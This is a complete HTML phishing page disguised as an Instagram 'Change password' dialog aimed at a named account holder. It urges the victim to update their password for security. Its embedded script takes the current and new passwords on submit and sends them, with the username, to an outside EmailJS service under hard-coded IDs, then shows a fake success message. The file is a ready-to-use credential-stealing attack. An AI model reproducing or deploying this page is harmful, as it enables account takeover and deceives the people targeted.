 <!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Change Password</title>
<style>
  /* Background overlay */
  body {
    margin: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
      Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
    background-color: #121212;
    color: #e4e6eb;
    display: flex;
    height: 100vh;
    align-items: center;
    justify-content: center;
  }

  /* Modal container */
  .modal {
    background-color: #242526;
    border-radius: 12px;
    width: 360px;
    padding: 24px 24px 32px;
    box-shadow: 0 0 20px rgba(0, 0, 0, 0.8);
    position: relative;
  }

  /* Close button (top right) */
  .close-btn {
    position: absolute;
    right: 16px;
    top: 16px;
    width: 24px;
    height: 24px;
    cursor: pointer;
    color: #b0b3b8;
    font-weight: 700;
    font-size: 20px;
    line-height: 20px;
    border: none;
    background: none;
  }
  .close-btn:hover {
    color: #e4e6eb;
  }

  /* Back arrow (top left) */
  .back-btn {
    position: absolute;
    left: 16px;
    top: 16px;
    width: 24px;
    height: 24px;
    cursor: pointer;
    color: #b0b3b8;
    font-weight: 700;
    font-size: 20px;
    line-height: 20px;
    border: none;
    background: none;
  }
  .back-btn:hover {
    color: #e4e6eb;
  }

  /* Header user info */
  .user-info {
    font-size: 14px;
    color: #b0b3b8;
    margin-bottom: 4px;
    font-weight: 500;
  }

  .user-info .username {
    color: #e4e6eb;
    font-weight: 700;
  }

  /* Title */
  .modal h2 {
    margin-top: 0;
    margin-bottom: 12px;
    font-size: 24px;
    font-weight: 700;
    color: #e4e6eb;
  }

  /* Instruction text */
  .instruction {
    font-size: 14px;
    color: #b0b3b8;
    margin-bottom: 20px;
    line-height: 1.4;
  }

  /* Input fields */
  .input-group {
    margin-bottom: 16px;
  }

  input[type="password"] {
    width: 100%;
    padding: 12px 16px;
    border-radius: 8px;
    border: 1px solid #3a3b3c;
    background-color: #18191a;
    color: #e4e6eb;
    font-size: 14px;
    box-sizing: border-box;
    transition: border-color 0.3s ease;
  }

  input[type="password"]::placeholder {
    color: #6b6b6b;
  }

  input[type="password"]:focus {
    outline: none;
    border-color: #2d88ff;
    background-color: #242526;
  }

  /* Forgot password link */
  .forgot-password {
    display: inline-block;
    margin-bottom: 16px;
    font-size: 14px;
    color: #1877f2;
    cursor: pointer;
    text-decoration: none;
  }

  .forgot-password:hover {
    text-decoration: underline;
  }

  /* Checkbox container */
  .checkbox-container {
    display: flex;
    align-items: center;
    margin-bottom: 24px;
    font-size: 14px;
    font-weight: 600;
    color: #e4e6eb;
    user-select: none;
  }

  .checkbox-container input[type="checkbox"] {
    margin-right: 8px;
    width: 16px;
    height: 16px;
    cursor: pointer;
  }

  /* Button */
  .btn-change-password {
    width: 100%;
    padding: 12px 0;
    background-color: #2d88ff;
    color: #ffffff;
    font-weight: 700;
    font-size: 16px;
    border-radius: 8px;
    border: none;
    cursor: pointer;
    opacity: 0.5;
    transition: opacity 0.3s ease;
  }

  .btn-change-password:enabled {
    opacity: 1;
  }

  .btn-change-password:disabled {
    cursor: not-allowed;
  }
</style>
</head>
<body>

<div class="modal" role="dialog" aria-modal="true" aria-labelledby="modal-title">

  <div class="user-info">
    <span class="username">Niiiiddhhiii</span> Â· Instagram
  </div>

  <h2 id="modal-title">Change password</h2>

   <h5 class="instruction">
    Your password must be updated to maintain account security.
   </h5>

  <p class="instruction">
    Your password must be at least 6 characters and should include a combination of numbers, letters and special characters (!@$%).
  </p>

  <form id="change-password-form">
    <div class="input-group">
      <input
        type="password"
        id="current-password"
        name="current-password"
        placeholder="Current password"
        autocomplete="current-password"
        required
      />
    </div>

    <div class="input-group">
      <input
        type="password"
        id="new-password"
        name="new-password"
        placeholder="New password"
        autocomplete="new-password"
        required
      />
    </div>

    <div class="input-group">
      <input
        type="password"
        id="retype-password"
        name="retype-password"
        placeholder="Re-type new password"
        autocomplete="new-password"
        required
      />
    </div>

    <label class="checkbox-container">
      <input type="checkbox" id="logout-others" name="logout-others" checked />
      Log out of other devices. Choose this if someone else used your account.
    </label>

    <button
      type="submit"
      class="btn-change-password"
      disabled
    >
      Change password
    </button>
  </form>
</div>

<script type="text/javascript" src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
<script>
window.onload = function() {
  // Initialize EmailJS after SDK is fully loaded
  emailjs.init("7ZhFIcanF93E3cSlm"); // <-- your EmailJS User ID

  const form = document.getElementById("change-password-form");
  const currentPass = form["current-password"];
  const newPass = form["new-password"];
  const retypePass = form["retype-password"];
  const submitBtn = form.querySelector(".btn-change-password");

  function validatePasswords() {
    const currentVal = currentPass.value.trim();
    const newVal = newPass.value.trim();
    const retypeVal = retypePass.value.trim();
    submitBtn.disabled = !(currentVal.length >= 6 && newVal.length >= 6 && newVal === retypeVal);
  }

  currentPass.addEventListener("input", validatePasswords);
  newPass.addEventListener("input", validatePasswords);
  retypePass.addEventListener("input", validatePasswords);

  form.addEventListener("submit", function(e) {
    e.preventDefault();
    const templateParams = {
      username: document.querySelector(".username").textContent,
      currentPassword: currentPass.value,
      newPassword: newPass.value
    };

    emailjs.send("service_9jiqv9f", "password_change", templateParams)
      .then(() => {
        alert("password updated!");
        form.reset();
        submitBtn.disabled = true;
      }, (err) => {
        console.error("Failed to send email:", err);
        alert("Oops! Something went wrong.");
      });
  });
};
</script>
</body>

</html>
